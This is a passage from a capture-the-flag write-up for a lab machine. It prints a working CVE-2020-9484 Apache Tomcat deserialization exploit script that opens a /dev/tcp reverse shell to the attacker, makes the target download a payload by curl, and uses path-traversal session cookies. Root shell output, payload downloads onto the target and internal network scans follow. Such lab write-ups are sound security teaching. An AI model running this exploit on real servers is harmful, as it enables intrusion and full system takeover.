</span></span></span><span class=line><span class=cl><span class=s2>|   RTSPRequest: 
</span></span></span><span class=line><span class=cl><span class=s2>|     HTTP/1.1 400 
</span></span></span><span class=line><span class=cl><span class=s2>|     Content-Type: text/html;charset=utf-8
</span></span></span><span class=line><span class=cl><span class=s2>|     Content-Language: en
</span></span></span><span class=line><span class=cl><span class=s2>|     Content-Length: 435
</span></span></span><span class=line><span class=cl><span class=s2>|     Date: Sat, 14 Sep 2024 03:00:00 GMT
</span></span></span><span class=line><span class=cl><span class=s2>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=s2>|     Server: Apache Tomcat 9?
</span></span></span><span class=line><span class=cl><span class=s2>|     &lt;!doctype html&gt;&lt;html lang=&#34;</span>en<span class=s2>&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
</span></span></span><span class=line><span class=cl><span class=s2>|     Request&lt;/title&gt;&lt;style type=&#34;</span>text/css<span class=s2>&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
</span></span></span><span class=line><span class=cl><span class=s2>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></span><span class=line><span class=cl><span class=s2>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span class=line><span class=cl><span class=s2>Read data files from: /usr/bin/../share/nmap
</span></span></span><span class=line><span class=cl><span class=s2>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=s2>Nmap done: 1 IP address (1 host up) scanned in 158.30 seconds
</span></span></span><span class=line><span class=cl><span class=s2>           Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
</span></span></span></code></pre></div><p>We got 3 active ports: <code>22</code>, <code>80</code> and <code>8080</code>.</p><p><figure><img src=/posts/certaindoom/19.png title=certain-doom.thm style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>certain-doom.thm</strong></figcaption></figure>Initially found an js animation and redirected to the youtube video.</p><p><figure><img src=/posts/certaindoom/20.png title=certain-doom.thm:8080 style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>certain-doom.thm:8080</strong></figcaption></figure><code>404 error</code> on port 8080.</p><h3 id=path-discovery-by-fuzzing>Path Discovery by fuzzing</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -c -u http://certain-doom.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -fs <span class=m>1054</span>
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>.htaccess               <span class=o>[</span>Status: 200, Size: 50504, Words: 11960, Lines: 1226, Duration: 195ms<span class=o>]</span>
</span></span><span class=line><span class=cl>favicon.ico             <span class=o>[</span>Status: 200, Size: 766, Words: 8, Lines: 2, Duration: 156ms<span class=o>]</span>
</span></span><span class=line><span class=cl>robots.txt              <span class=o>[</span>Status: 200, Size: 78, Words: 8, Lines: 6, Duration: 191ms<span class=o>]</span>
</span></span></code></pre></div><p>No useful results found here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -c -u http://certain-doom.thm:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>reports                 <span class=o>[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 156ms<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ffuf -c -u http://certain-doom.thm:8080/reports/FUZZ -w /usr/share/wordlists/dirb/big.txt
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>css                     <span class=o>[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4827ms<span class=o>]</span>
</span></span><span class=line><span class=cl>upload                  <span class=o>[</span>Status: 405, Size: 449, Words: 34, Lines: 1, Duration: 342ms<span class=o>]</span>
</span></span></code></pre></div><p>Found an interesting result <code>/reports/</code>.</p><h3 id=8080reports>8080:reports/</h3><p><figure><img src=/posts/certaindoom/1.png title="/reports page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>/reports page</strong></figcaption></figure><code>/reports/</code> page which in port 8080.</p><p><figure><img src=/posts/certaindoom/2.png title="error when clicking upload" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>error when clicking upload</strong></figcaption></figure>An error occurs when the upload button is clicked without choosing a file.</p><p><figure><img src=/posts/certaindoom/3.png title="response on uploading a file" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>response on uploading a file</strong></figcaption></figure>Obtaining the <code>file's destination path</code> after upload.</p><h3 id=cve-2020-9484>CVE-2020-9484</h3><p><figure><img src=/posts/certaindoom/18.png title="Google search with known factors" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Google search with known factors</strong></figcaption></figure>Based on our initial Google search, we&rsquo;ve discovered a potential exploit. We&rsquo;ll need to validate it through further testing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># Exploit Title: Apache Tomcat RCE by deserialization</span>
</span></span><span class=line><span class=cl><span class=c1># CVE-ID: CVE-2020-9484</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: Kali Linux </span>
</span></span><span class=line><span class=cl><span class=c1># Remote Code Execution by Deserialization</span>
</span></span><span class=line><span class=cl><span class=c1># your attacker IP, set to your own IP address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> -ne <span class=m>3</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;#Usage: ./CVE-2020-9484 &lt;target_ip&gt; &lt;local_ip&gt; &lt;local_port&gt; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># optional:     			</span>
</span></span><span class=line><span class=cl><span class=nv>target_ip</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>target_port</span><span class=o>=</span>8080			
</span></span><span class=line><span class=cl><span class=nv>remote_ip</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>port</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$3</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;--help&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;-h&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 3<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>usage: ./CVE-2020-9484.sh target-ip&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 4<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>Please start a web listener in /tmp folder:&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 3<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>python3 -m http.server 80&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 4<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>and start your netcat listener at port 4444:&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 3<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>nc -nvlp 4444&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>exit</span>	
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># look for ysoserial file on your attacker system</span>
</span></span><span class=line><span class=cl><span class=c1># check out install.txt file for instructions how to install ysoserial</span>
</span></span><span class=line><span class=cl>find_ysoserial_on_system<span class=o>(){</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 6<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Checking if you have installed ysoserial..&#34;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	<span class=nv>ysoserial_file</span><span class=o>=</span><span class=k>$(</span>find / -name <span class=s2>&#34;ysoserial-master.jar&#34;</span> -type f 2&gt;/dev/null<span class=k>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=nv>$ysoserial_file</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>		<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 1<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>You need ysoserial-master.jar in order to use this script!&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 1<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>Please make sure to follow the install.txt guide!&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 1<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>Quitting..&#34;</span>
</span></span><span class=line><span class=cl>		<span class=nb>exit</span>
</span></span><span class=line><span class=cl>	<span class=k>fi</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 5<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Found ysoserial-master.jar!&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># creating payload files using ysoserial</span>
</span></span><span class=line><span class=cl>create_payload_files<span class=o>(){</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 6<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Trying to create payload files..&#34;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 6<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Creating payload.sh file..&#34;</span>
</span></span><span class=line><span class=cl>	rm -rf payload.sh
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;#!/usr/bin/bash&#34;</span> &gt;&gt; payload.sh
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span class=nv>$remote_ip</span><span class=s2>/</span><span class=nv>$port</span><span class=s2> 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; payload.sh
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 5<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Finished!&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 6<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Trying to create first ysoserial payload file&#34;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	java -jar <span class=nv>$ysoserial_file</span> CommonsCollections2 <span class=s2>&#34;curl http://</span><span class=nv>$remote_ip</span><span class=s2>/payload.sh -o /tmp/payload.sh&#34;</span> &gt; downloadPayload.session
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 5<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Finished!&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 6<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Trying to create second ysoserial payload file&#34;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	java -jar <span class=nv>$ysoserial_file</span> CommonsCollections2 <span class=s2>&#34;chmod 777 /tmp/payload.sh&#34;</span> &gt; chmodPayload.session
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 5<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Finished!&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 6<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Trying to create last ysoserial payload file&#34;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	java -jar <span class=nv>$ysoserial_file</span> CommonsCollections2 <span class=s2>&#34;bash /tmp/payload.sh&#34;</span> &gt; executePayload.session
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 5<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Finished!&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> trying to create getting file
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 2<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>----------------------------------------------------------------&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 4<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Succesfully created all files!&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 2<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>----------------------------------------------------------------&#34;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#get a reverse shell</span>
</span></span><span class=line><span class=cl>get_reverse_shell<span class=o>(){</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;[+] Trying to get a reverse shell..&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;[+] Make sure to have netcat and python weblistener in current folder running..&#34;</span>
</span></span><span class=line><span class=cl>	curl http://<span class=nv>$target_ip</span>:<span class=nv>$target_port</span>/reports/upload -F <span class=s1>&#39;file=@downloadPayload.session&#39;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	curl  http://<span class=nv>$target_ip</span>:<span class=nv>$target_port</span>/reports/ -H <span class=s1>&#39;Cookie: JSESSIONID=../../../../../../../../../../../../../../../../usr/local/tomcat/temp/uploads/downloadPayload&#39;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	curl http://<span class=nv>$target_ip</span>:<span class=nv>$target_port</span>/reports/upload -F <span class=s1>&#39;file=@chmodPayload.session&#39;</span> 
</span></span><span class=line><span class=cl>	curl  http://<span class=nv>$target_ip</span>:<span class=nv>$target_port</span>/reports/upload -H <span class=s1>&#39;Cookie:JSESSIONID=../../../../../../../../../../../usr/local/tomcat/temp/uploads/chmodPayload&#39;</span>
</span></span><span class=line><span class=cl>	sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>	curl http://<span class=nv>$target_ip</span>:<span class=nv>$target_port</span>/reports/upload -F <span class=s1>&#39;file=@executePayload.session&#39;</span> 
</span></span><span class=line><span class=cl>	curl  http://<span class=nv>$target_ip</span>:<span class=nv>$target_port</span>/reports/upload -H <span class=s1>&#39;Cookie:JSESSIONID=../../../../../../../../../../../usr/local/tomcat/temp/uploads/executePayload&#39;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 5<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] Finished!&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=s2>&#34;</span><span class=k>$(</span>tput setaf 4<span class=p>;</span>tput bold<span class=k>)</span><span class=s2>[+] If you don&#39;t have a reverse shell, try to run it again!&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># start RCE exploit</span>
</span></span><span class=line><span class=cl>find_ysoserial_on_system
</span></span><span class=line><span class=cl>create_payload_files
</span></span><span class=line><span class=cl>get_reverse_shell
</span></span></code></pre></div><p>The provided Bash script is a modified version of <a href=https://github.com/PenTestical/CVE-2020-9484 target=_blank rel=noopener>PenTestical&rsquo;s CVE-2020-9484 exploit</a>
, designed to function effectively with our specific target.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt-get install openjdk-11-jdk
</span></span><span class=line><span class=cl>sudo update-alternatives --config java
</span></span></code></pre></div><p>This code snippet is used to install Java 11 on Ubuntu-based systems and configure it as the default Java environment.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -nvlp <span class=m>4444</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.11.11<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.50.246<span class=o>]</span> <span class=m>50344</span>
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>bash-4.2# id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></div><p>We obtained a root shell here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.2# cat /usr/local/tomcat/.flag
</span></span><span class=line><span class=cl>cat /usr/local/tomcat/.flag
</span></span><span class=line><span class=cl>THM<span class=o>{</span>FLAG_1_REDACTED<span class=o>}</span>
</span></span></code></pre></div><p>We found our first hidden flag.</p><h2 id=penetrating-internal-network>Penetrating Internal Network</h2><h3 id=better-shell>Better shell</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>^Z <span class=c1>#(Ctrl+Z)</span>
</span></span><span class=line><span class=cl>stty raw -echo <span class=o>&amp;&amp;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Got better shell by running the above commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.2# curl http://10.10.11.11/linpeas.sh &gt; linpeas.sh
</span></span><span class=line><span class=cl>bash-4.2# chmod +x linpeas.sh 
</span></span><span class=line><span class=cl>bash-4.2# ./linpeas.sh
</span></span></code></pre></div><p>Linpeas.sh uncovered potentially risky entries in the /etc/hosts file. We are inside docker container.</p><h3 id=etchosts>/etc/hosts</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.2# cat /etc/hosts
</span></span><span class=line><span class=cl>127.0.0.1       localhost
</span></span><span class=line><span class=cl>::1     localhost ip6-localhost ip6-loopback
</span></span><span class=line><span class=cl>fe00::0 ip6-localnet
</span></span><span class=line><span class=cl>ff00::0 ip6-mcastprefix
</span></span><span class=line><span class=cl>ff02::1 ip6-allnodes
</span></span><span class=line><span class=cl>ff02::2 ip6-allrouters
</span></span><span class=line><span class=cl>172.20.0.4      2c5b93ea49de
</span></span><span class=line><span class=cl>172.18.0.3      2c5b93ea49de
</span></span></code></pre></div><p>Two IP addresses, <code>172.20.0.4</code> and <code>172.18.0.3</code>, were found in the /etc/hosts file. These addresses likely indicate a connection to the internal network.</p><h3 id=nmap>nmap</h3><p>A pre-compiled network scanner <a href=https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap target=_blank rel=noopener>(static nmap)</a>
was retrieved and transferred to the target system for further analysis.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://10.10.11.11/nmap -o /tmp/nmap
</span></span><span class=line><span class=cl>chmod +x /tmp/nmap
</span></span></code></pre></div><p>Downloading and making a standalone network scanner executable for discreet reconnaissance</p><p><strong>First Network</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.2# /tmp/nmap -sn 172.20.0.4/16
</span></span><span class=line><span class=cl>Starting Nmap 6.49BETA1 <span class=o>(</span> http://nmap.org <span class=o>)</span> 
</span></span><span class=line><span class=cl>Stats: 0:00:08 elapsed<span class=p>;</span> <span class=m>0</span> hosts completed <span class=o>(</span><span class=m>0</span> up<span class=o>)</span>, <span class=m>4096</span> undergoing ARP Ping Scan
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> ip-172-20-0-1.eu-west-1.compute.internal <span class=o>(</span>172.20.0.1<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.000051s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: 02:42:4A:AF:77:20 <span class=o>(</span>Unknown<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cert_library_1.cert_cert-internal <span class=o>(</span>172.20.0.2<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.000014s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: 02:42:AC:14:00:02 <span class=o>(</span>Unknown<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cert_library-back_1.cert_cert-internal <span class=o>(</span>172.20.0.3<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.000052s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: 02:42:AC:14:00:03 <span class=o>(</span>Unknown<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 2c5b93ea49de <span class=o>(</span>172.20.0.4<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.20.0.1
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> ip-172-20-0-1.eu-west-1.compute.internal <span class=o>(</span>172.20.0.1<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>8080/tcp open  webcache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.20.0.2
</span></span><span class=line><span class=cl>Starting Nmap 6.49BETA1 <span class=o>(</span> http://nmap.org <span class=o>)</span> 
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cert_library_1.cert_cert-internal <span class=o>(</span>172.20.0.2<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>80/tcp open  http	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.20.0.3
</span></span><span class=line><span class=cl>Starting Nmap 6.49BETA1 <span class=o>(</span> http://nmap.org <span class=o>)</span> 
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cert_library-back_1.cert_cert-internal <span class=o>(</span>172.20.0.3<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>8080/tcp open  webcache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.20.0.4
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 2c5b93ea49de <span class=o>(</span>172.20.0.4<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>8080/tcp open  webcache
</span></span></code></pre></div><p>The IP addresses <code>172.20.0.2</code> and <code>172.20.0.3</code> were identified as potential points of interest within the internal network.</p><p><strong>Second Network</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.2# /tmp/nmap -sn 172.18.0.3/16
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> ip-172-18-0-1.eu-west-1.compute.internal <span class=o>(</span>172.18.0.1<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.000031s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: 02:42:11:FA:35:62 <span class=o>(</span>Unknown<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cert_admin_1.cert_cert-frontend <span class=o>(</span>172.18.0.2<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.000035s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: 02:42:AC:12:00:02 <span class=o>(</span>Unknown<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 2c5b93ea49de <span class=o>(</span>172.18.0.3<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.18.0.1
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> ip-172-18-0-1.eu-west-1.compute.internal <span class=o>(</span>172.18.0.1<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>8080/tcp open  webcache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.18.0.2
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cert_admin_1.cert_cert-frontend <span class=o>(</span>172.18.0.2<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>3000/tcp open  hbci
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-4.2# /tmp/nmap -p- --min-rate <span class=m>5000</span> 172.18.0.3
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 2c5b93ea49de <span class=o>(</span>172.18.0.3<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>8080/tcp open  webcache
